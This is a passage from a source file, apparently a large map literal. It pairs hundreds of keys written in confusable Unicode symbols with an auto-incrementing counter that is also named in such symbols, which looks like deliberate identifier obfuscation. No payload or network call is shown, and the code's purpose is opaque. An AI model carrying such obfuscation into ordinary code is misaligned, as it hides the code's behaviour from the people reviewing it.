			"ᐃΔΔⲆᐃΔᐃ": ᐃⲆ++,
			"ᐃⲆΔⵠⵠⵠⲆ": ᐃⲆ++,
			"ⲆΔᐃⲆᐃⲆⲆ": ᐃⲆ++,
			"ⲆΔᐃΔⲆⲆΔ": ᐃⲆ++,
			"ⵠΔⲆⵠΔⲆᐃ": ᐃⲆ++,
			"ⵠⲆⲆΔΔⲆΔ": ᐃⲆ++,
			"ᐃᐃᐃᐃᐃΔⲆ": ᐃⲆ++,
			"ⵠᐃᐃΔⵠⵠⵠ": ᐃⲆ++,
			"ᐃᐃᐃᐃⲆⵠᐃ": ᐃⲆ++,
			"ᐃⲆΔⵠⲆⵠⲆ": ᐃⲆ++,
			"ⲆⵠΔᐃⵠⵠⵠⵠⵠ": ᐃⲆ++,
			"ᐃΔΔⵠᐃΔΔ": ᐃⲆ++,
			"ΔᐃⲆΔⲆⲆᐃⵠΔ": ᐃⲆ++,
			"ᐃⲆⲆⵠⲆᐃᐃ": ᐃⲆ++,
			"ΔⲆᐃⵠᐃⵠΔⵠⵠ": ᐃⲆ++,
			"ΔⲆⲆⵠΔΔΔΔΔ": ᐃⲆ++,
			"ⲆⲆΔᐃⵠΔⵠᐃⲆ": ᐃⲆ++,
			"ⵠᐃΔⲆΔⵠΔᐃᐃ": ᐃⲆ++,
			"ⲆΔΔΔᐃΔΔᐃᐃ": ᐃⲆ++,
			"ΔᐃΔⵠⲆⵠⲆ": ᐃⲆ++,
			"ⲆⵠΔⵠⲆ": ᐃⲆ++,
			"ΔⲆΔⲆⲆⵠⵠ": ᐃⲆ++,
			"ⵠᐃΔᐃⵠᐃⵠ": ᐃⲆ++,
			"ΔⲆⵠⲆⵠⵠⵠ": ᐃⲆ++,
			"ΔⵠⵠⵠⲆⲆⵠⲆⲆ": ᐃⲆ++,
			"ⵠᐃⵠΔⲆᐃᐃ": ᐃⲆ++,
			"ⲆⲆᐃⲆΔᐃⵠ": ᐃⲆ++,
			"ΔⲆⵠΔⵠᐃⵠ": ᐃⲆ++,
			"ⲆⲆᐃΔⵠΔⲆ": ᐃⲆ++,
			"ⵠᐃⵠᐃⵠᐃᐃ": ᐃⲆ++,
			"ΔⲆⲆᐃᐃᐃΔ": ᐃⲆ++,
			"ⵠⲆᐃᐃⲆᐃⵠ": ᐃⲆ++,
			"ⲆΔⵠΔⵠⵠᐃ": ᐃⲆ++,
			"ᐃⲆΔⲆᐃⵠⵠ": ᐃⲆ++,
			"ⵠⵠⲆⵠᐃⵠᐃ": ᐃⲆ++,
			"ΔⵠⵠΔΔⲆⵠ": ᐃⲆ++,
			"ⲆⲆᐃΔᐃ": ᐃⲆ++,
			"ⵠⲆᐃⵠⲆ": ᐃⲆ++,
			"ᐃⲆΔⵠⲆ": ᐃⲆ++,
			"ⵠΔⲆⲆⲆᐃᐃⲆᐃ": ᐃⲆ++,
			"ⲆⵠⲆⵠΔΔⲆ": ᐃⲆ++,
			"ⲆΔⵠⲆⲆΔΔ": ᐃⲆ++,
			"ⵠᐃⲆᐃⵠᐃⵠ": ᐃⲆ++,
			"ⵠⲆᐃΔΔⵠΔ": ᐃⲆ++,
			"ⲆⲆⲆᐃᐃⵠᐃ": ᐃⲆ++,
			"ⵠᐃΔⵠⵠᐃⵠ": ᐃⲆ++,
			"ᐃΔᐃΔⵠᐃⵠ": ᐃⲆ++,
			"ᐃⵠᐃⵠᐃⲆΔ": ᐃⲆ++,
			"ⲆᐃΔΔΔⵠΔ": ᐃⲆ++,
			"ⵠᐃΔⵠⲆΔⵠ": ᐃⲆ++,
			"ΔⲆⲆⲆⲆᐃΔ": ᐃⲆ++,
			"ⵠⲆⵠⵠΔⵠⵠ": ᐃⲆ++,
			"ⲆΔⵠΔⵠᐃⵠ": ᐃⲆ++,
			"ⲆΔᐃΔⵠΔᐃ": ᐃⲆ++,
			"ᐃΔΔᐃΔ": ᐃⲆ++,
			"ⵠⵠⲆᐃΔⲆⲆ": ᐃⲆ++,
			"ⵠⲆΔᐃⲆⲆᐃ": ᐃⲆ++,
			"ΔⲆⲆⵠⲆⲆΔ": ᐃⲆ++,
			"ⲆⲆⲆΔⲆⲆⲆ": ᐃⲆ++,
			"ᐃⲆⲆⵠⲆΔⲆ": ᐃⲆ++,
			"ΔⲆΔⲆᐃⵠⲆ": ᐃⲆ++,
			"ΔⵠᐃⲆΔᐃⵠ": ᐃⲆ++,
			"ⲆΔΔΔΔΔⲆ": ᐃⲆ++,
			"ᐃⵠⵠΔΔⵠΔ": ᐃⲆ++,
			"ΔᐃⲆⵠΔⵠᐃ": ᐃⲆ++,
			"ΔᐃΔΔⵠᐃⵠ": ᐃⲆ++,
			"ⵠᐃⵠⲆⲆⲆᐃ": ᐃⲆ++,
			"ⵠΔⵠΔⵠΔⲆ": ᐃⲆ++,
			"ⲆⵠᐃⲆⲆΔⵠ": ᐃⲆ++,
			"ᐃᐃΔᐃⵠⲆᐃ": ᐃⲆ++,
			"ⵠᐃΔⲆΔⲆᐃ": ᐃⲆ++,
			"ΔΔⵠⲆⲆᐃⲆ": ᐃⲆ++,
			"ⵠⵠᐃᐃᐃΔΔ": ᐃⲆ++,
			"ⲆᐃⲆⲆⲆΔⲆ": ᐃⲆ++,
			"ΔⲆⲆᐃⵠᐃⵠ": ᐃⲆ++,
			"ⲆⲆᐃΔΔᐃᐃ": ᐃⲆ++,
			"ⵠⵠⲆᐃΔΔΔ": ᐃⲆ++,
			"ⵠᐃⵠΔΔΔΔ": ᐃⲆ++,
			"ⲆΔⲆⵠΔΔⵠ": ᐃⲆ++,
			"ⵠΔⲆⲆⵠⲆᐃ": ᐃⲆ++,
			"ΔᐃΔΔⲆΔⵠ": ᐃⲆ++,
			"ⲆⵠⵠΔΔⵠΔ": ᐃⲆ++,
			"ⵠᐃⲆⲆᐃⵠΔ": ᐃⲆ++,
			"ᐃⵠᐃⲆᐃΔⲆ": ᐃⲆ++,
			"ΔⲆⲆᐃᐃⲆⲆ": ᐃⲆ++,
			"ΔΔⲆΔΔᐃⵠ": ᐃⲆ++,
			"ⵠΔⲆᐃⵠⲆᐃ": ᐃⲆ++,
			"ΔⵠⲆⵠⵠᐃⵠ": ᐃⲆ++,
			"ΔΔΔⲆⵠⲆᐃ": ᐃⲆ++,
			"ᐃⲆⲆⵠⲆⲆⲆ": ᐃⲆ++,
			"ᐃΔⵠⲆⵠ": ᐃⲆ++,
			"ⲆⲆⲆᐃᐃΔΔ": ᐃⲆ++,
			"ᐃΔᐃΔⲆⲆΔ": ᐃⲆ++,
			"ᐃΔⲆⲆⵠ": ᐃⲆ++,
			"ΔᐃΔΔⲆΔⵠⲆΔ": ᐃⲆ++,
			"ⲆⲆᐃⵠᐃᐃⵠ": ᐃⲆ++,
			"ⵠⲆΔⲆᐃ": ᐃⲆ++,
			"ⲆⲆⲆΔᐃᐃⲆ": ᐃⲆ++,
			"ΔⵠΔᐃᐃⵠⵠ": ᐃⲆ++,
			"ᐃⵠⲆⲆⵠⵠᐃ": ᐃⲆ++,
			"ᐃΔΔⵠⵠΔⵠ": ᐃⲆ++,
			"ᐃΔⵠⵠⲆᐃΔ": ᐃⲆ++,
			"ᐃⲆᐃᐃⲆⵠᐃ": ᐃⲆ++,
			"ΔΔᐃΔΔⲆⵠ": ᐃⲆ++,
			"ᐃᐃᐃᐃⵠⵠᐃ": ᐃⲆ++,
			"ᐃΔᐃᐃᐃΔⵠ": ᐃⲆ++,
			"ᐃᐃⵠⲆⵠΔⵠ": ᐃⲆ++,
			"ΔⲆΔⵠⲆΔᐃ": ᐃⲆ++,
			"ⵠᐃⵠⵠΔ": ᐃⲆ++,
			"ⵠⵠⲆⵠᐃ": ᐃⲆ++,
			"ⲆᐃᐃⲆⵠ": ᐃⲆ++,
			"ΔΔⲆΔΔ": ᐃⲆ++,
			"ⵠΔᐃⵠⲆ": ᐃⲆ++,
			"ⲆᐃⵠᐃⲆΔⲆ": ᐃⲆ++,
			"ᐃⲆⲆⵠᐃⲆΔ": ᐃⲆ++,
			"ΔΔΔΔⲆᐃᐃ": ᐃⲆ++,
			"ᐃᐃΔⵠⲆⵠⵠ": ᐃⲆ++,
			"ⲆⲆᐃⵠⲆΔᐃ": ᐃⲆ++,
			"ⲆΔΔⲆΔᐃⲆ": ᐃⲆ++,
			"ΔⲆⲆⲆᐃᐃΔ": ᐃⲆ++,
			"ᐃⵠⲆΔᐃⲆⵠ": ᐃⲆ++,
			"ⲆᐃⲆΔⲆⲆΔ": ᐃⲆ++,
			"ΔΔⵠⲆⲆⲆΔ": ᐃⲆ++,
			"ⵠⵠᐃⵠᐃⲆᐃ": ᐃⲆ++,
			"ⵠᐃⲆΔΔⵠⲆ": ᐃⲆ++,
			"ⲆᐃᐃⲆΔᐃⵠ": ᐃⲆ++,
			"ⲆΔⲆᐃΔⲆΔ": ᐃⲆ++,
			"ᐃᐃᐃΔⲆⲆⵠ": ᐃⲆ++,
			"ᐃⵠᐃΔⵠⲆᐃ": ᐃⲆ++,
			"ᐃⲆΔⲆᐃⵠΔ": ᐃⲆ++,
			"ΔⲆΔⵠΔⵠⵠ": ᐃⲆ++,
			"ᐃΔΔⲆⲆᐃⲆ": ᐃⲆ++,
			"ⵠΔⵠⵠⵠⲆᐃ": ᐃⲆ++,
			"ⲆᐃⲆⲆΔΔᐃ": ᐃⲆ++,
			"ΔⲆⲆᐃⵠᐃⲆ": ᐃⲆ++,
			"ⵠΔⵠᐃⲆⲆⵠ": ᐃⲆ++,
			"ⲆᐃΔᐃⲆΔᐃ": ᐃⲆ++,
			"ΔᐃⲆᐃⵠⵠᐃ": ᐃⲆ++,
			"ⵠⵠΔⵠᐃᐃⵠᐃⲆ": ᐃⲆ++,
			"ⵠΔⵠⵠⵠΔⵠ": ᐃⲆ++,
			"ⲆΔᐃΔⵠⲆⲆ": ᐃⲆ++,
			"ⵠᐃᐃᐃⵠⵠⲆ": ᐃⲆ++,
			"ᐃⵠΔᐃⲆⲆᐃ": ᐃⲆ++,
			"ᐃᐃⲆⲆⲆⲆⵠ": ᐃⲆ++,
			"ⲆΔⵠⵠⲆ": ᐃⲆ++,
			"ᐃⵠⵠΔⵠⵠᐃ": ᐃⲆ++,
			"ᐃᐃⲆⵠᐃⲆⵠ": ᐃⲆ++,
			"ΔⲆᐃᐃⵠΔΔ": ᐃⲆ++,
			"ⲆᐃⵠᐃⲆᐃΔ": ᐃⲆ++,
			"ⵠⵠⲆᐃⲆᐃᐃ": ᐃⲆ++,
			"ⵠⵠⵠⵠⲆΔΔ": ᐃⲆ++,
			"ᐃᐃⵠΔⵠⵠⵠ": ᐃⲆ++,
			"ⲆᐃⵠΔⵠⲆᐃ": ᐃⲆ++,
			"ⲆⲆᐃᐃΔᐃΔ": ᐃⲆ++,
			"ⵠⵠΔⲆΔⵠⲆ": ᐃⲆ++,
			"ⲆⵠΔⵠᐃⲆⵠ": ᐃⲆ++,
			"ⵠⲆⵠᐃᐃᐃⲆ": ᐃⲆ++,
			"ᐃⲆᐃⵠᐃΔⵠ": ᐃⲆ++,
			"ⵠⲆΔⵠⵠⵠⵠ": ᐃⲆ++,
			"ⵠⵠΔⲆⵠⵠⲆ": ᐃⲆ++,
			"ⲆΔΔⵠⵠΔⵠ": ᐃⲆ++,
			"ΔᐃⲆΔᐃⲆⲆ": ᐃⲆ++,
			"ⲆⵠΔΔⲆⵠᐃ": ᐃⲆ++,
			"ⲆⲆᐃΔⲆⲆΔ": ᐃⲆ++,
			"ⲆⵠᐃΔⲆΔⵠ": ᐃⲆ++,
			"ᐃⵠΔⵠⵠⵠΔ": ᐃⲆ++,
			"ᐃᐃⲆⵠⲆΔⵠ": ᐃⲆ++,
			"ⵠⲆⲆᐃⵠⵠΔ": ᐃⲆ++,
			"ᐃΔⲆⲆⲆⲆⲆ": ᐃⲆ++,
			"ⵠᐃⵠΔᐃᐃᐃ": ᐃⲆ++,
			"ⵠⵠΔⵠΔⲆᐃ": ᐃⲆ++,
			"ΔⲆⲆΔᐃⵠⵠ": ᐃⲆ++,
			"ⵠᐃᐃΔⵠΔΔ": ᐃⲆ++,
			"ᐃΔᐃⲆⵠΔⵠ": ᐃⲆ++,
			"ⲆⵠⵠᐃⲆⵠΔ": ᐃⲆ++,
			"ⲆⲆΔΔⲆⵠⲆ": ᐃⲆ++,
			"ⲆⵠΔⵠⲆᐃⲆ": ᐃⲆ++,
			"ⵠⲆⵠⵠᐃⵠⵠ": ᐃⲆ++,
			"ⲆᐃⵠⵠⵠΔⲆ": ᐃⲆ++,
			"ⲆⵠⵠΔⲆⵠᐃ": ᐃⲆ++,
			"ΔⵠᐃⲆⵠΔᐃ": ᐃⲆ++,
			"ΔⵠⲆᐃΔΔⲆ": ᐃⲆ++,
			"ⲆⲆⵠⵠΔⲆⵠ": ᐃⲆ++,
			"ΔᐃⵠᐃᐃᐃΔ": ᐃⲆ++,
			"ᐃΔᐃΔⲆⲆⵠ": ᐃⲆ++,
			"ⵠⵠⲆⲆⵠᐃΔ": ᐃⲆ++,
			"ⲆⵠⵠΔⵠⲆᐃ": ᐃⲆ++,
			"ⵠⵠᐃΔⲆΔΔ": ᐃⲆ++,
			"ΔᐃᐃᐃΔⲆΔ": ᐃⲆ++,
			"ΔⲆΔΔⵠⵠⲆ": ᐃⲆ++,
			"ΔⲆΔᐃⲆⵠᐃ": ᐃⲆ++,
			"ⵠⵠΔⲆΔᐃⲆ": ᐃⲆ++,
			"ΔⵠᐃᐃⵠᐃⲆ": ᐃⲆ++,
			"ⲆⵠⲆᐃⲆⵠΔ": ᐃⲆ++,
			"ΔⲆΔⵠⲆᐃᐃ": ᐃⲆ++,
			"ⵠⵠΔⲆΔⵠᐃ": ᐃⲆ++,
			"ΔⵠⲆⲆΔⲆⲆ": ᐃⲆ++,
			"ⲆⲆᐃᐃᐃⲆⵠ": ᐃⲆ++,
			"ⲆⲆᐃⲆⵠⲆⵠ": ᐃⲆ++,
			"ⵠᐃⵠⵠΔᐃᐃ": ᐃⲆ++,
			"ᐃⲆΔⵠⲆⲆᐃ": ᐃⲆ++,
			"ᐃΔⵠⵠⵠΔᐃ": ᐃⲆ++,
			"ᐃᐃⵠΔΔΔⵠ": ᐃⲆ++,
			"ⵠΔΔᐃⲆΔᐃ": ᐃⲆ++,
			"ⲆⵠⲆᐃⲆᐃᐃ": ᐃⲆ++,
			"ⵠⲆΔΔⵠΔΔ": ᐃⲆ++,
			"ΔᐃΔⵠΔᐃⵠ": ᐃⲆ++,
			"ΔᐃΔⵠⵠᐃⲆ": ᐃⲆ++,
			"ⵠⵠⲆΔⵠⲆΔ": ᐃⲆ++,
			"ⵠⵠⲆⲆΔᐃᐃ": ᐃⲆ++,
			"ΔᐃᐃⵠΔ": ᐃⲆ++,
			"ⲆⵠⵠΔΔΔⵠ": ᐃⲆ++,
			"ⲆⲆᐃΔΔΔⲆ": ᐃⲆ++,
			"ⲆⲆᐃᐃᐃ": ᐃⲆ++,
			"ᐃⲆⲆⲆΔⲆⵠ": ᐃⲆ++,
			"ΔΔΔΔᐃᐃⵠ": ᐃⲆ++,
			"ⵠΔᐃΔⲆΔⲆ": ᐃⲆ++,
			"ⲆⵠⵠⲆᐃΔᐃ": ᐃⲆ++,
			"ᐃⵠΔⵠᐃΔΔ": ᐃⲆ++,
			"Ⲇⵠⵠᐃᐃ": ᐃⲆ++,
			"ⵠΔⲆᐃⵠᐃᐃ": ᐃⲆ++,
			"ⲆⵠΔⲆⵠⵠⵠᐃΔ": ᐃⲆ++,
			"ΔⵠΔᐃⲆᐃΔᐃᐃ": ᐃⲆ++,
			"ⲆⵠⵠᐃⵠᐃᐃΔⵠ": ᐃⲆ++,
			"ᐃᐃᐃᐃⵠⵠⵠᐃⲆ": ᐃⲆ++,
			"ⵠⲆΔⲆᐃΔⲆ": ᐃⲆ++,
			"ⲆⲆⵠⵠᐃΔⵠ": ᐃⲆ++,
			"ΔⵠⲆⵠⲆⲆΔ": ᐃⲆ++,
			"ⲆΔⲆᐃΔΔⵠ": ᐃⲆ++,
			"ΔⵠᐃᐃⲆⵠⵠ": ᐃⲆ++,
			"ΔΔⲆΔⲆΔⲆ": ᐃⲆ++,
			"ΔⲆⵠΔᐃΔⲆ": ᐃⲆ++,
			"ⲆΔᐃⵠᐃⲆⵠ": ᐃⲆ++,
			"ⵠⵠΔⵠΔᐃΔ": ᐃⲆ++,
			"ⵠⵠⲆⲆΔΔⲆ": ᐃⲆ++,
			"ⲆⲆΔⲆΔ": ᐃⲆ++,
			"Ⲇᐃⵠⵠᐃ": ᐃⲆ++,
			"ⲆᐃⲆⵠᐃⲆΔ": ᐃⲆ++,
			"ⵠⵠᐃⵠⲆΔⵠ": ᐃⲆ++,
			"ⵠⵠⲆΔΔⵠΔ": ᐃⲆ++,
			"ΔΔⵠⵠΔⲆᐃ": ᐃⲆ++,
			"ΔΔᐃᐃⵠΔΔ": ᐃⲆ++,
			"ᐃᐃⲆⲆΔᐃⵠ": ᐃⲆ++,
			"ΔΔⲆΔⲆᐃΔ": ᐃⲆ++,
			"ᐃΔⲆΔⵠᐃⵠ": ᐃⲆ++,
			"ᐃΔᐃΔⵠΔΔ": ᐃⲆ++,
			"ᐃⲆⵠⲆⵠⲆΔ": ᐃⲆ++,
			"ⵠⵠⲆⵠᐃᐃΔ": ᐃⲆ++,
			"ᐃΔΔᐃⵠⵠᐃ": ᐃⲆ++,
			"ᐃⵠⵠⲆᐃΔΔᐃᐃ": ᐃⲆ++,
			"ΔⵠⵠΔΔᐃⲆⲆⲆ": ᐃⲆ++,
			"ⲆΔΔⲆᐃΔΔ": ᐃⲆ++,
			"ⵠΔⲆⲆⵠⲆⵠ": ᐃⲆ++,
			"ⵠⵠⲆΔᐃⲆΔ": ᐃⲆ++,
			"ᐃᐃᐃΔⵠᐃⲆ": ᐃⲆ++,
			"ΔᐃⲆᐃⵠΔⲆ": ᐃⲆ++,
			"ᐃᐃⲆΔᐃΔΔ": ᐃⲆ++,
			"ᐃΔⲆᐃⵠΔⵠ": ᐃⲆ++,
			"Δⵠⵠⵠᐃᐃⵠ": ᐃⲆ++,
			"ᐃⲆΔᐃΔΔⵠ": ᐃⲆ++,
			"ⲆⲆⲆⵠⵠⵠΔ": ᐃⲆ++,
			"ΔⵠⲆᐃⵠᐃⲆ": ᐃⲆ++,
			"ⵠΔⵠΔΔᐃᐃ": ᐃⲆ++,
			"ⲆⲆⲆΔᐃᐃΔ": ᐃⲆ++,
			"ⵠⲆᐃⵠΔΔⲆ": ᐃⲆ++,
			"ΔΔᐃᐃᐃᐃⵠ": ᐃⲆ++,
			"ΔⲆᐃⲆᐃᐃⵠ": ᐃⲆ++,
			"ⲆⵠΔⵠᐃⵠΔ": ᐃⲆ++,
			"ⲆΔΔⲆᐃᐃⵠ": ᐃⲆ++,
			"ΔⲆⵠⲆΔΔⵠⵠⵠ": ᐃⲆ++,
			"ⲆⲆⵠⲆⵠⲆᐃ": ᐃⲆ++,
			"ᐃⲆΔⵠΔ": ᐃⲆ++,
			"ⲆⲆΔΔᐃⲆΔⵠᐃ": ᐃⲆ++,
			"ⲆⲆⲆⲆᐃᐃⲆⲆⵠ": ᐃⲆ++,
			"ᐃᐃᐃᐃⲆΔΔᐃΔ": ᐃⲆ++,
			"ⵠᐃᐃⲆΔⵠᐃⵠⲆ": ᐃⲆ++,
			"ΔΔᐃΔΔᐃⲆ": ᐃⲆ++,
			"ΔΔⲆⵠΔⵠⵠ": ᐃⲆ++,
			"ⲆᐃⲆⲆᐃⲆΔ": ᐃⲆ++,
			"ᐃⵠⲆⵠΔΔⲆ": ᐃⲆ++,
			"ΔⲆⲆᐃΔⵠⲆ": ᐃⲆ++,
			"ΔᐃⵠⵠⲆᐃΔᐃΔ": ᐃⲆ++,
			"ⵠΔⲆⲆⵠᐃΔ": ᐃⲆ++,
			"ᐃⵠΔΔⲆΔⵠ": ᐃⲆ++,
			"ΔⵠⵠΔⵠᐃΔ": ᐃⲆ++,
			"ΔᐃΔⵠΔⲆⵠ": ᐃⲆ++,
			"ΔⵠΔᐃΔᐃⲆ": ᐃⲆ++,
			"ⵠᐃᐃⵠᐃⵠΔ": ᐃⲆ++,
			"ᐃᐃⲆᐃΔᐃᐃ": ᐃⲆ++,
			"ⵠⵠᐃᐃⲆ": ᐃⲆ++,
			"ᐃⵠᐃⵠⵠᐃᐃⵠⵠ": ᐃⲆ++,
			"ᐃⲆᐃⵠⲆⵠΔ": ᐃⲆ++,
			"ΔΔⲆⵠⲆᐃⵠ": ᐃⲆ++,
			"ⲆⲆⵠⵠᐃⲆⵠ": ᐃⲆ++,
			"ⲆⲆᐃⵠⲆᐃᐃ": ᐃⲆ++,
			"ⲆⲆᐃΔⲆⵠᐃ": ᐃⲆ++,
			"ΔΔⵠⵠᐃⲆⲆ": ᐃⲆ++,
			"ΔⲆⲆᐃⵠΔᐃ": ᐃⲆ++,
			"ⵠᐃⵠᐃᐃⵠᐃ": ᐃⲆ++,
			"ᐃⲆⵠⲆᐃᐃᐃ": ᐃⲆ++,
			"ΔᐃᐃΔⲆᐃⲆ": ᐃⲆ++,
			"ΔⵠⵠⵠᐃᐃⲆ": ᐃⲆ++,
			"ᐃΔᐃⲆⲆΔᐃ": ᐃⲆ++,
			"ΔⲆⵠⲆΔᐃⵠ": ᐃⲆ++,
			"ⲆΔᐃᐃΔ": ᐃⲆ++,
			"ⵠⲆⲆⲆⲆⲆⵠ": ᐃⲆ++,
			"ΔΔΔⲆᐃΔΔ": ᐃⲆ++,
			"ⵠⲆᐃⵠᐃⵠⲆ": ᐃⲆ++,
			"ᐃⲆⵠⵠᐃⵠᐃ": ᐃⲆ++,
			"ⵠⲆΔⲆΔΔⲆ": ᐃⲆ++,
			"ΔΔΔᐃΔⵠⵠ": ᐃⲆ++,
			"ᐃⵠᐃⲆⵠⵠⵠ": ᐃⲆ++,
			"ᐃⲆΔⲆⵠⲆⵠ": ᐃⲆ++,
			"ⲆᐃΔᐃⲆⵠᐃ": ᐃⲆ++,
			"ⵠⲆⲆⲆⲆᐃΔ": ᐃⲆ++,
			"ⵠⵠⵠⲆⲆᐃⵠ": ᐃⲆ++,
			"ⲆΔΔⲆⵠΔΔ": ᐃⲆ++,
			"ᐃⲆⲆⵠΔᐃᐃ": ᐃⲆ++,
			"ⵠⵠᐃΔⲆⲆΔ": ᐃⲆ++,
			"ⵠᐃΔΔⲆΔⲆ": ᐃⲆ++,
			"ⲆᐃᐃⲆⲆⵠΔ": ᐃⲆ++,
			"ⲆⲆΔΔᐃⵠΔ": ᐃⲆ++,
			"ΔⲆⲆᐃᐃΔΔ": ᐃⲆ++,
			"ⲆΔⲆᐃΔⵠⲆ": ᐃⲆ++,
			"ΔᐃΔⵠⵠᐃΔ": ᐃⲆ++,
			"ⵠⵠⵠᐃⵠⲆⵠ": ᐃⲆ++,
			"ᐃⲆⵠᐃⵠⲆΔ": ᐃⲆ++,
			"ⲆⵠΔⲆΔΔΔ": ᐃⲆ++,
			"ΔΔᐃΔⲆⵠΔ": ᐃⲆ++,
			"ᐃΔⲆᐃⵠᐃΔ": ᐃⲆ++,
			"ⵠΔⲆⵠⲆⲆⵠ": ᐃⲆ++,
			"ΔⲆⵠⲆⲆΔΔᐃⵠ": ᐃⲆ++,
			"ⲆΔᐃⲆⵠᐃΔΔᐃ": ᐃⲆ++,
			"ⲆᐃΔᐃⵠΔᐃΔⵠ": ᐃⲆ++,
			"ᐃᐃⲆᐃⲆⵠΔⵠΔ": ᐃⲆ++,
			"ⵠⵠⵠⵠⵠⲆⲆ": ᐃⲆ++,
			"ⵠᐃⵠⲆⵠⵠΔ": ᐃⲆ++,
			"ᐃⲆⵠⵠⵠ": ᐃⲆ++,
			"ΔΔⲆᐃΔⵠᐃ": ᐃⲆ++,
			"ⲆⲆⲆΔⵠΔⲆ": ᐃⲆ++,
			"ⵠΔᐃΔⲆⲆⲆ": ᐃⲆ++,
			"ΔᐃᐃⵠⲆΔᐃ": ᐃⲆ++,
			"ⲆⵠⵠᐃᐃΔΔ": ᐃⲆ++,
			"ᐃⵠᐃΔⲆΔⲆ": ᐃⲆ++,
			"ᐃⵠΔⵠᐃⲆᐃ": ᐃⲆ++,
			"ⵠⵠᐃᐃⲆΔⲆ": ᐃⲆ++,
			"ΔᐃΔⲆⵠᐃⲆ": ᐃⲆ++,
			"ᐃΔᐃⲆΔᐃᐃ": ᐃⲆ++,
			"ΔⵠΔⵠⲆⲆⵠ": ᐃⲆ++,
			"ⲆᐃΔⲆᐃΔⲆ": ᐃⲆ++,
			"ⵠⲆᐃⲆᐃⵠⵠ": ᐃⲆ++,
			"ΔΔᐃᐃΔᐃⵠ": ᐃⲆ++,
			"ΔⲆᐃΔⵠΔΔ": ᐃⲆ++,
			"ΔⲆᐃⵠᐃᐃⲆ": ᐃⲆ++,
			"ⲆᐃⵠᐃⵠⲆⲆ": ᐃⲆ++,
			"ⲆⵠⲆⲆᐃⵠⲆ": ᐃⲆ++,
			"ΔⵠⲆⵠᐃᐃⲆ": ᐃⲆ++,
			"ⵠᐃΔⵠΔⲆΔΔᐃ": ᐃⲆ++,
			"ΔᐃⵠⲆᐃ": ᐃⲆ++,
			"ΔⲆⵠⲆᐃⲆᐃ": ᐃⲆ++,
			"ⵠᐃⲆⲆΔΔⵠ": ᐃⲆ++,
			"ⲆⲆⵠΔᐃⵠⵠ": ᐃⲆ++,
			"ΔⲆᐃΔΔᐃⵠ": ᐃⲆ++,
			"ⵠΔⵠᐃΔΔᐃ": ᐃⲆ++,
			"ⲆⲆᐃΔΔⲆⵠ": ᐃⲆ++,
			"ⲆᐃΔᐃⵠᐃⲆ": ᐃⲆ++,
			"ⵠⲆⲆᐃⵠⵠⲆ": ᐃⲆ++,
			"ᐃⵠⲆΔᐃⲆⲆ": ᐃⲆ++,
			"ⲆΔᐃⵠⲆΔⲆ": ᐃⲆ++,
			"ⵠⲆⵠΔⲆᐃᐃ": ᐃⲆ++,
			"ⲆⵠⵠᐃⵠΔᐃ": ᐃⲆ++,
			"ⲆΔΔⵠΔᐃᐃ": ᐃⲆ++,
			"ⵠᐃΔⵠⲆᐃⲆ": ᐃⲆ++,
			"ᐃΔΔᐃΔΔΔ": ᐃⲆ++,
			"ⵠⵠⵠⵠⵠᐃΔ": ᐃⲆ++,
			"ᐃᐃΔⲆⲆᐃⵠ": ᐃⲆ++,
			"ᐃⵠⲆΔᐃᐃⵠ": ᐃⲆ++,
			"ΔΔΔΔⵠΔᐃ": ᐃⲆ++,
			"ᐃΔⲆⵠⵠΔᐃ": ᐃⲆ++,
			"ᐃᐃΔⵠᐃⲆΔ": ᐃⲆ++,
			"ⵠᐃⲆⲆⵠᐃⵠ": ᐃⲆ++,
			"ΔⵠᐃⵠⵠⲆⲆΔⵠ": ᐃⲆ++,
			"ⵠⲆᐃΔΔΔⲆ": ᐃⲆ++,
			"ᐃΔⲆⵠᐃⲆⲆ": ᐃⲆ++,
			"ᐃⲆΔᐃⵠⲆᐃ": ᐃⲆ++,
			"ΔⲆⵠΔᐃⵠⵠ": ᐃⲆ++,
			"ⲆΔⵠᐃΔⲆⲆ": ᐃⲆ++,
			"ⵠⲆⵠΔᐃΔᐃ": ᐃⲆ++,
			"ⲆᐃⲆⲆⵠⵠᐃ": ᐃⲆ++,
			"ⵠΔΔᐃΔΔⵠ": ᐃⲆ++,
			"ⵠⲆⲆΔⲆᐃᐃ": ᐃⲆ++,
			"ᐃⵠΔⵠⵠⲆΔ": ᐃⲆ++,
			"ⲆᐃᐃⵠᐃᐃⲆ": ᐃⲆ++,
			"ΔⲆⵠⲆⵠⵠᐃ": ᐃⲆ++,
			"ⲆΔⲆᐃⵠⲆⵠ": ᐃⲆ++,
			"ⵠΔⵠΔⵠᐃⲆ": ᐃⲆ++,
			"ⲆⲆⵠᐃᐃΔⲆ": ᐃⲆ++,
			"ΔᐃⵠⲆΔΔΔ": ᐃⲆ++,
			"ⵠᐃᐃⲆⵠⲆⲆ": ᐃⲆ++,
			"ᐃⵠⲆⲆⵠⲆⲆ": ᐃⲆ++,
			"ᐃᐃΔᐃΔᐃⵠ": ᐃⲆ++,
			"ⲆⲆΔⲆⲆⵠⲆ": ᐃⲆ++,
			"ᐃΔⵠᐃⲆⵠⵠ": ᐃⲆ++,
			"ΔⵠⵠΔᐃⲆⲆ": ᐃⲆ++,
			"ΔⲆⲆᐃⵠᐃΔ": ᐃⲆ++,
			"ⲆⵠᐃΔⵠᐃⵠ": ᐃⲆ++,
			"ⵠᐃΔᐃΔ": ᐃⲆ++,
			"ΔⲆΔⵠᐃΔⵠ": ᐃⲆ++,
			"ᐃⲆⵠⵠⵠⲆΔ": ᐃⲆ++,
			"ᐃⲆⵠⵠⲆΔⲆ": ᐃⲆ++,
			"ⵠΔⲆᐃⵠΔᐃ": ᐃⲆ++,
			"ᐃᐃᐃᐃⲆᐃⲆ": ᐃⲆ++,
			"ⲆᐃᐃΔⲆⵠᐃ": ᐃⲆ++,
			"ΔⲆⵠΔⲆᐃⵠ": ᐃⲆ++,
			"ⲆΔᐃⲆⲆⵠᐃ": ᐃⲆ++,
			"ᐃᐃⵠⲆΔᐃᐃ": ᐃⲆ++,
			"ᐃⲆΔⵠΔⵠΔ": ᐃⲆ++,
			"ᐃᐃΔⵠⲆᐃᐃ": ᐃⲆ++,
			"ΔⲆΔⲆΔⵠⵠ": ᐃⲆ++,
			"ⲆⲆⲆⵠⲆΔᐃ": ᐃⲆ++,
			"ⵠⲆⲆΔᐃⵠⲆ": ᐃⲆ++,
			"ⵠⵠⲆⲆΔⲆᐃ": ᐃⲆ++,
			"ᐃⵠⲆᐃᐃⲆΔ": ᐃⲆ++,
			"ᐃⲆⲆΔⲆΔᐃ": ᐃⲆ++,
